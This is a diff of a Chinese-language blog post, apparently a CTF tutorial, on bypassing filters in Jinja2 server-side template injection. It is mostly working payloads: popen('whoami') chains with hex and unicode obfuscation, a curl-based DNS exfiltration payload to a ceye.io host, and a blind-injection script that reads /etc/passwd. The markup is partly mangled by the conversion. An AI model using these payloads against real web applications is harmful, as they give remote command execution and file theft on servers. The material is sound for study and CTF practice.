@@ -5504,68 +5504,49 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure>
 
 <p>这种同样是绕过关键字的方法之一</p>
-<h3 id="过滤双大括号"><a href="#过滤双大括号" class="headerlink" title="过滤双大括号"></a>过滤双大括号</h3><p>过滤了<code>&#123;&#123;`和`&#125;&#125;</code></p>
-<ul>
-<li>使用dns外带数据</li>
-</ul>
-<p>用<code>&#123;%%&#125;</code>替代了<code>&#123;&#123;&#125;&#125;`，使用判断语句进行dns外带数据
+<h3 id="过滤双大括号"><a href="#过滤双大括号" class="headerlink" title="过滤双大括号"></a>过滤双大括号</h3><p>过滤了<code>&#123;&#123;&#125;&#125;`
 
+- 使用dns外带数据
+
+用`&#123;%%&#125;`替代了`&#123;&#123;&#125;&#125;</code>，使用判断语句进行dns外带数据</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;kawhi&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
 
-然后在ceye平台接收数据即可
-
-![image-20201128122047252](http://yuhaojiang.gitee.io/picture/细说Jinja2之SSTI&bypass/image-20201128122047252.png)
-
-- 盲注
-
-如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本
-
+<p>然后在ceye平台接收数据即可</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201128122047252.png" alt="image-20201128122047252"></p>
+<ul>
+<li>盲注</li>
+</ul>
+<p>如果上面的方法不行的话，可以考虑使用盲注的方式，这里附上p0师傅的脚本</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ip:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read()[&#x27;</span>+str(i)+<span class="string">&#x27;:&#x27;</span>+str(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> password</span><br></pre></td></tr></table></figure>
 
-- `print`标记
-
-我们上面之所以要dnslog外带数据以及使用盲注，是因为用`&#123;%%&#125;`会没有回显，这里的话可以使用`print`来做一个标记使得他有回显，比如`&#123;%print config%&#125;`，payload如下
-
+<ul>
+<li><code>print</code>标记</li>
+</ul>
+<p>我们上面之所以要dnslog外带数据以及使用盲注，是因为用<code>&#123;%%&#125;`会没有回显，这里的话可以使用`print`来做一个标记使得他有回显，比如`&#123;%print config%&#125;</code>，payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</span><br></pre></td></tr></table></figure>
 
-## payload进阶与拓展
-
-这里我基于上面绕过黑名单各种方法的组合，对CTF中用到的一些方法和payload再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展
-
-### 过滤`_`和`.`和`'`
-
-这里顺便给一个不常见的方法，主要是找到`_frozen_importlib_external.FileLoader`的`get_data()`方法，第一个是参数0，第二个为要读取的文件名，payload如下
-
+<h2 id="payload进阶与拓展"><a href="#payload进阶与拓展" class="headerlink" title="payload进阶与拓展"></a>payload进阶与拓展</h2><p>这里我基于上面绕过黑名单各种方法的组合，对CTF中用到的一些方法和payload再做一个小的总结，不过其实一般来说，只要不是太偏太绕的题，上面的方法自行组合一下都够用了，下面只是作为一个拓展</p>
+<h3 id="过滤-和-和-39"><a href="#过滤-和-和-39" class="headerlink" title="过滤_和.和&#39;"></a>过滤<code>_</code>和<code>.</code>和<code>&#39;</code></h3><p>这里顺便给一个不常见的方法，主要是找到<code>_frozen_importlib_external.FileLoader</code>的<code>get_data()</code>方法，第一个是参数0，第二个为要读取的文件名，payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">222</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-使用十六进制绕过后，payload如下
-
+<p>使用十六进制绕过后，payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">222</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-### 过滤`args`和`.`和`_`
-
-之前安恒二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了`attr()`绕过点，`values`绕过`args`，payload如下
-
+<h3 id="过滤args和-和"><a href="#过滤args和-和" class="headerlink" title="过滤args和.和_"></a>过滤<code>args</code>和<code>.</code>和<code>_</code></h3><p>之前安恒二月赛在y1ng师傅博客看到的一个payload，原理并不难，这里使用了<code>attr()</code>绕过点，<code>values</code>绕过<code>args</code>，payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x1&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x2&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x3&#x27;</span>])()|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(<span class="number">40</span>)|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x5&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x6&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x7&#x27;</span>])|attr(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x4&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x8&#x27;</span>])(request[<span class="string">&#x27;values&#x27;</span>][<span class="string">&#x27;x9&#x27;</span>])&#125;&#125;</span><br><span class="line"></span><br><span class="line">post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
 
-### 导入主函数读取变量
-
-有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把`/flag`文件加载到flag这个变量里面了
-
+<h3 id="导入主函数读取变量"><a href="#导入主函数读取变量" class="headerlink" title="导入主函数读取变量"></a>导入主函数读取变量</h3><p>有一些题目我们不并需要去getshell，比如flag直接暴露在变量里面了，像如下这样把<code>/flag</code>文件加载到flag这个变量里面了</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br></pre></td></tr></table></figure>
 
-我们就可以通过`import`是导入`__main__`主函数去读变量，payload如下
-
+<p>我们就可以通过<code>import</code>是导入<code>__main__</code>主函数去读变量，payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">print</span> request.application.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;__main__&#x27;</span>).flag %&#125;</span><br></pre></td></tr></table></figure>
 
-### Unicode绕过
-
-这种方法是从[安洵杯2020 官方Writeup](https://xz.aliyun.com/t/8581#toc-4)学到的，我们直奔主题看payload
-
+<h3 id="Unicode绕过"><a href="#Unicode绕过" class="headerlink" title="Unicode绕过"></a>Unicode绕过</h3><p>这种方法是从<a href="https://xz.aliyun.com/t/8581#toc-4">安洵杯2020 官方Writeup</a>学到的，我们直奔主题看payload</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(%<span class="number">22</span>\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%<span class="number">22</span>))|attr(%<span class="number">22</span>\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f%<span class="number">22</span>)(%<span class="number">22</span>os%<span class="number">22</span>)|attr(%<span class="number">22</span>popen%<span class="number">22</span>)(%<span class="number">22</span>whoami%<span class="number">22</span>)|attr(%<span class="number">22</span>read%<span class="number">22</span>)()%&#125;</span><br></pre></td></tr></table></figure>
 
-这里的`print`绕过`&#123;&#123;&#125;&#125;</code>和<code>attr</code>绕过<code>.</code>上面已经说过了这里不赘述</p>
-<p>然后这里的<code>lipsum</code>用<code>&#123;&#123;lipsum&#125;&#125;</code>测了一下发现是个方法</p>
+<p>这里的<code>print</code>绕过<code>&#123;&#123;&#125;&#125;`和`attr`绕过`.`上面已经说过了这里不赘述
+
+然后这里的`lipsum`用`&#123;&#123;lipsum&#125;&#125;</code>测了一下发现是个方法</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;function generate_lorem_ipsum at 0x7fcddfa296a8&gt;</span><br></pre></td></tr></table></figure>
 
 <p>然后用他直接调用<code>__globals__</code>发现可以直接执行os命令，测了一下发现<code>__builtins__</code>也可以用，又学到了一种新方法，只能说师傅们tql</p>
